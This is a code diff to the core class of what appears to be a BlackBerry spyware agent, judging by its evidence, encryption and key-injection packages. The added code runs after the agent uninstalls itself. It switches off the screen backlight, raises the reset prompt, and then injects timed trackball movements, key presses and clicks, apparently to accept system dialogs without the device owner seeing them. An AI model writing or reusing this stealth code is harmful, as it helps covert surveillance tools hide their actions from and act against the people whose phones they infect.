@@ -14,15 +14,18 @@ import java.util.Date;
 import net.rim.device.api.applicationcontrol.ApplicationPermissions;
 import net.rim.device.api.applicationcontrol.ApplicationPermissionsManager;
 import net.rim.device.api.system.ApplicationDescriptor;
+import net.rim.device.api.system.Backlight;
 import net.rim.device.api.system.CodeModuleGroup;
 import net.rim.device.api.system.CodeModuleGroupManager;
 import net.rim.device.api.system.CodeModuleManager;
+import net.rim.device.api.ui.Keypad;
 import blackberry.config.Cfg;
 import blackberry.crypto.Encryption;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
 import blackberry.fs.Path;
+import blackberry.injection.KeyInjector;
 import blackberry.utils.Utils;
 
 /**
@@ -317,10 +320,30 @@ public final class Core implements Runnable {
 
         final int moduleHandle = ad.getModuleHandle();
         final int rc = CodeModuleManager.deleteModuleEx(moduleHandle, true);
-        //#ifdef DEBUG
-        System.out.println("uninstalled: " + rc);
+        
+        //TODO: sperimentale
+        Backlight.enable(false);
         CodeModuleManager.promptForResetIfRequired();
-        //#endif
+        Backlight.enable(false);
+        Utils.sleep(500);
+        KeyInjector.trackBallDown(20);
+        Utils.sleep(500);
+        KeyInjector.trackBallUp(1);
+        Utils.sleep(500);
+        KeyInjector.pressKey(Keypad.KEY_ENTER);
+        Utils.sleep(500);
+        KeyInjector.trackBallDown(20);
+        Utils.sleep(500);
+        KeyInjector.trackBallUp(1);
+        Utils.sleep(500);
+        KeyInjector.trackBallClick();
+        Utils.sleep(500);
+        KeyInjector.trackBallDown(20);
+        Utils.sleep(500);
+        KeyInjector.trackBallUp(1);
+        Utils.sleep(500);
+        KeyInjector.trackBallClick();
+        
     }
 
     /**
